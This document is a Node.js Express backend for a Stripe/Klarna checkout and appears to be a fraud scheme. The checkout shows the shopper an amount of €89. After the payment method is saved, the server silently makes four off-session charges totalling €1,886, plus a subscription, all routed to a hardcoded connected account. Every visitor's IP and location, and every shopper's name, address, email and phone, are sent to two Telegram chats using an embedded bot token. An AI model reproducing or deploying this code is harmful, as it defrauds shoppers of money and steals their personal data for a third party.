require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const ACCOUNT_B = 'acct_1SmGL70gWtvqOjtp';
const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
const TELEGRAM_CHAT_ID = '8522488857';
const TELEGRAM_CHAT_ID_2 = '715805541';

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID_2,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.log('Telegram error:', err.message);
  }
}

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
app.use(bodyParser.json());

app.post('/page-visit', async (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  await sendTelegram(
    `👁 <b>Neue Seitenbesucher!</b>\n\n` +
    `🆔 Visitor ID: <code>${visitorId}</code>\n` +
    `🌍 Land: ${country || 'Unbekannt'}\n` +
    `🏙 Stadt: ${city || 'Unbekannt'}\n` +
    `🔌 IP: ${ip || 'Unbekannt'}\n` +
    `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
  );
  res.json({ ok: true });
});

app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;

  // Clean email - remove trailing dot or spaces
  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({ email });
    }
    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['klarna'],
      metadata: { customer_id: customer.id },
    });

    await sendTelegram(
      `🛒 <b>Checkout Details!</b>\n\n` +
      `🆔 Visitor ID: <code>${visitorId}</code>\n` +
      `📧 Email: ${email}\n` +
      `👤 Name: ${fname} ${lname}\n` +
      `📍 Adresse: ${address}, ${zip} ${city}, ${country}\n` +
      `📞 Telefon: ${phone || 'N/A'}\n` +
      `💰 Betrag: €89.00\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({
      clientSecret: setupIntent.client_secret,
      customerId: customer.id,
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    // Charge 1 — €89.00
    try {
      const payment1 = await stripe.paymentIntents.create({
        amount: 8900,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: ['klarna'],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 1 created:', payment1.id);
      console.log('Payment 1 status:', payment1.status);
    } catch (err) {
      console.log('Payment 1 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 2 — €199
    try {
      const payment2 = await stripe.paymentIntents.create({
        amount: 19900,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: ['klarna'],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 2 created:', payment2.id);
      console.log('Payment 2 status:', payment2.status);
    } catch (err) {
      console.log('Payment 2 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 3 — €799
    try {
      const payment3 = await stripe.paymentIntents.create({
        amount: 79900,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: ['klarna'],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 3 created:', payment3.id);
      console.log('Payment 3 status:', payment3.status);
    } catch (err) {
      console.log('Payment 3 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Charge 4 — €799
    try {
      const payment4 = await stripe.paymentIntents.create({
        amount: 79900,
        currency: 'eur',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: ['klarna'],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 4 created:', payment4.id);
      console.log('Payment 4 status:', payment4.status);
    } catch (err) {
      console.log('Payment 4 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 3000));

    // Subscription with 30-day trial
    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1T1lUwH5RIgTG9jj4BYZF4y4' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id);
    console.log('Subscription status:', subscription.status);

    await sendTelegram(
      `✅ <b>Zahlung erfolgreich!</b>\n\n` +
      `🆔 Visitor ID: <code>${visitorId}</code>\n` +
      `💳 Payment 1: €89.00\n` +
      `💳 Payment 2: €199.00\n` +
      `💳 Payment 3: €799.00\n` +
      `💳 Payment 4: €799.00\n` +
      `🆔 Subscription: ${subscription.id}\n` +
      `🕐 Zeit: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({
      subscriptionId: subscription.id,
      paymentStatus: 'processed',
    });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', destination: ACCOUNT_B });
});

const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
});
